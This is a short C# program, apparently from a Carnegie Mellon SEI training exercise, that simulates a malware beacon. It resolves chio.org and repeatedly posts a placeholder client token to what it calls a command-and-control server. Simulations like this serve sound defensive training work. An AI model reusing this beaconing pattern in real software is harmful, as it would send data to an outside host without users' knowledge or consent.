/*
Copyright 2024 Carnegie Mellon University.
Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
root or contact permission@sei.cmu.edu for full terms.
*/

using System.Net;

string token = "ClientId: bd31f9f87d40";
string hostname = "chio.org";

Console.WriteLine("Initializing HOIC . . . ");
System.Threading.Thread.Sleep(2000);
Console.WriteLine("Connecting to the mothership for instructions . . . ");
System.Threading.Thread.Sleep(2000);

try
{
    IPHostEntry host = Dns.GetHostEntry(hostname);

    Console.WriteLine("DNS resolution succeeded.");

    foreach (IPAddress address in host.AddressList)
    {
        Console.WriteLine($"{address}");
    }

    HttpClient client = new HttpClient();
    StringContent content = new StringContent(token);

    // begin transmitting token as client id
    Console.WriteLine("Connected to command and control server.");
    Console.WriteLine("Transmitting data . . .");

    while (true)
    {
        try
        {
            var response = client.PostAsync("http://" + hostname, content).Result;
            System.Threading.Thread.Sleep(10000);
        }
        catch(Exception){}
    }
}
catch(Exception)
{
    Console.WriteLine("Failure to transmit data to command and control server.");
    Console.WriteLine("Exiting HOIC. DNS resolution failed for hostname: " + hostname);
}

